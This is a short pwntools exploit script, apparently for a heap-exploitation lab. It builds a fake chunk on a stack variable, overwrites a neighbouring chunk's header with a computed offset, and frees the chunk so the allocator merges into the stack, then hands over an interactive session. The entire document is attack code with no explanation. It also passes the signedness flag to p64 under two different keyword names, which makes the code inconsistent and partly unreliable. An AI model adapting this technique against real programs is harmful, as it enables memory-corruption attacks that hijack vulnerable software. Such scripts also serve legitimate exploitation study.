from pwn import *
from handle import *

def exploit():
	malloc(0x10)
	malloc(0xf8)
	malloc(0x10) #B is not last chunk

	B = chunk_info(1)
	B_address = B[0]

	fake_chunk = stack_var_1_address()
	k = (B_address - 2*0x8 - fake_chunk)
	write_to_stack_var_1("AAAAAAAA" + p64(k,signed=True) + p64(fake_chunk) + p64(fake_chunk) + p64(fake_chunk) + p64(fake_chunk))

	write_to_chunk(0, "AAAAAAAAAAAAAAAA" + p64(k,sign=True))

	free_chunk(1)

	write_to_stack_var_1("AAAAAAAA" + p64(0x1000)) #B is not last chunk

	malloc(0x50)


p = exec_file()
exploit()
p.interactive()
p.close()
